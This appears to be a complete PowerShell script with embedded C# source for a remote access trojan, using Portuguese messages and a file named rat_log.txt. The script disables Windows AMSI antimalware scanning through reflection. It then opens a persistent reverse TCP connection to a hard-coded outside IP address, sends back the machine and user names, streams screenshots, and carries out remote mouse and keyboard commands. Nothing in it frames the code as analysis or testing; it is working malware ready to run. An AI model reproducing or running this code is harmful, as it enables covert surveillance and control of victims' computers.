$serverIP = "198.1.195.204"
$serverPort = 4000
$logPath = "$env:TEMP\rat_log.txt"

"Script iniciado..." | Out-File $logPath -Force
Write-Host "Compilando agente C#..." -ForegroundColor Cyan

$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
if ($amsi) { $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true) }

if (-not ("R9KAgent" -as [type])) {
    Add-Type -ReferencedAssemblies System.Windows.Forms, System.Drawing @"
    using System;
    using System.Drawing;
    using System.Drawing.Imaging;
    using System.IO;
    using System.Runtime.InteropServices;
    using System.Text;
    using System.Threading;
    using System.Net.Sockets;
    using System.Windows.Forms;

    public class R9KAgent {
        [DllImport("user32.dll")] public static extern void mouse_event(uint dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);
        [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        static string IP;
        static int PORT;
        static bool streaming = false;
        static object writeLock = new object();
        static int targetX = 0, targetY = 0;
        static bool hasNewPos = false;

        public static void Start(string ip, int port) {
            IP = ip; PORT = port;
            Thread tInput = new Thread(InputLoop); tInput.IsBackground = true; tInput.Start();

            while (true) {
                TcpClient myClient = null;
                try {
                    Console.WriteLine("Conectando em " + IP + ":" + PORT);
                    myClient = new TcpClient();
                    myClient.Connect(IP, PORT);
                    myClient.NoDelay = true;
                    NetworkStream myStream = myClient.GetStream();
                    StreamReader myReader = new StreamReader(myStream, new UTF8Encoding(false));
                    StreamWriter myWriter = new StreamWriter(myStream, new UTF8Encoding(false));
                    myWriter.AutoFlush = true;

                    myWriter.WriteLine("BANNER:" + Environment.MachineName + "@" + Environment.UserName + "|" + Screen.PrimaryScreen.Bounds.Width + "|" + Screen.PrimaryScreen.Bounds.Height + "|True");
                    Console.WriteLine("CONECTOU AO CONTROLE!");

                    Thread tRead = new Thread(() => ReadLoop(myClient, myReader, myWriter)); tRead.IsBackground = true; tRead.Start();
                    Thread tStream = new Thread(() => StreamLoop(myClient, myWriter)); tStream.IsBackground = true; tStream.Start();

                    while (myClient.Connected) {
                        if (myStream.Socket.Poll(1000, SelectMode.SelectRead) && myStream.Socket.Available == 0) break;
                        Thread.Sleep(100);
                    }
                } catch (Exception ex) { 
                    Console.WriteLine("ERRO: " + ex.Message);
                    Thread.Sleep(3000); 
                } finally {
                    streaming = false;
                    try { if (myClient != null) myClient.Close(); } catch {}
                }
            }
        }

        static void ReadLoop(TcpClient myClient, StreamReader myReader, StreamWriter myWriter) {
            try {
                while (myClient.Connected) {
                    string cmd = myReader.ReadLine();
                    if (cmd == null) break;
                    ProcessCommand(cmd.Trim(), myWriter);
                }
            } catch {}
            try { myClient.Close(); } catch {}
        }

        static void InputLoop() {
            while (true) {
                try {
                    if (hasNewPos) { Cursor.Position = new Point(targetX, targetY); hasNewPos = false; }
                } catch {}
                Thread.Sleep(10);
            }
        }

        static void StreamLoop(TcpClient myClient, StreamWriter myWriter) {
            while (myClient.Connected) {
                try {
                    if (streaming) {
                        string b64 = CaptureScreen(1280, 40);
                        if (b64 != null) {
                            lock (writeLock) { myWriter.WriteLine("SCREEN:" + b64); }
                        }
                        Thread.Sleep(30); 
                    } else { Thread.Sleep(50); }
                } catch { Thread.Sleep(1000); }
            }
        }

        static void ProcessCommand(string cmd, StreamWriter myWriter) {
            try {
                if (cmd == "stream_start") { streaming = true; return; }
                if (cmd == "stream_stop") { streaming = false; lock(writeLock) { myWriter.WriteLine("STREAM_STOPPED"); } return; }
                
                if (cmd == "screenshot") { lock(writeLock) { myWriter.WriteLine("SCREEN:" + CaptureScreen(1920, 85)); } return; }
                if (cmd == "ping") { lock(writeLock) { myWriter.WriteLine("PONG"); } return; }

                if (cmd.StartsWith("move ")) {
                    string[] p = cmd.Split(' ');
                    int nx = int.Parse(p[1]); int ny = int.Parse(p[2]);
                    targetX = (int)((nx / 65535.0) * Screen.PrimaryScreen.Bounds.Width);
                    targetY = (int)((ny / 65535.0) * Screen.PrimaryScreen.Bounds.Height);
                    hasNewPos = true; 
                }
                else if (cmd == "md 1") mouse_event(0x0002, 0, 0, 0, 0);
                else if (cmd == "mu 1") mouse_event(0x0004, 0, 0, 0, 0);
                else if (cmd == "md 2") mouse_event(0x0008, 0, 0, 0, 0);
                else if (cmd == "mu 2") mouse_event(0x0010, 0, 0, 0, 0);
                else if (cmd == "md 3") mouse_event(0x0020, 0, 0, 0, 0);
                else if (cmd == "mu 3") mouse_event(0x0040, 0, 0, 0, 0);
                else if (cmd.StartsWith("mw ")) mouse_event(0x0800, 0, 0, (uint)int.Parse(cmd.Substring(3)), 0);
                else if (cmd.StartsWith("kd ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 0, UIntPtr.Zero);
                else if (cmd.StartsWith("ku ")) keybd_event(byte.Parse(cmd.Substring(3)), 0, 2, UIntPtr.Zero);
            } catch {}
        }

        static string CaptureScreen(int maxW, long quality) {
            try {
                Rectangle bounds = Screen.PrimaryScreen.Bounds;
                using (Bitmap bmp = new Bitmap(bounds.Width, bounds.Height)) {
                    using (Graphics g = Graphics.FromImage(bmp)) { g.CopyFromScreen(0, 0, 0, 0, bmp.Size); }
                    Bitmap finalBmp = bmp;
                    if (maxW > 0 && bmp.Width > maxW) {
                        int newW = maxW, newH = (int)(bmp.Height * ((float)maxW / bmp.Width));
                        finalBmp = new Bitmap(newW, newH);
                        using (Graphics g2 = Graphics.FromImage(finalBmp)) {
                            g2.InterpolationMode = System.Drawing.Drawing2D.InterpolationMode.Bilinear;
                            g2.DrawImage(bmp, 0, 0, newW, newH);
                        }
                    }
                    using (MemoryStream ms = new MemoryStream()) {
                        EncoderParameters ep = new EncoderParameters(1);
                        ep.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, quality);
                        ImageCodecInfo[] codecs = ImageCodecInfo.GetImageDecoders();
                        ImageCodecInfo codec = null;
                        foreach (var c in codecs) { if (c.FormatID == ImageFormat.Jpeg.Guid) { codec = c; break; } }
                        finalBmp.Save(ms, codec, ep);
                        if (finalBmp != bmp) finalBmp.Dispose();
                        return Convert.ToBase64String(ms.ToArray());
                    }
                }
            } catch { return null; }
        }
    }
"@
}

Write-Host "C# compilado com sucesso. Iniciando..." -ForegroundColor Green
[R9KAgent]::Start($serverIP, $serverPort)
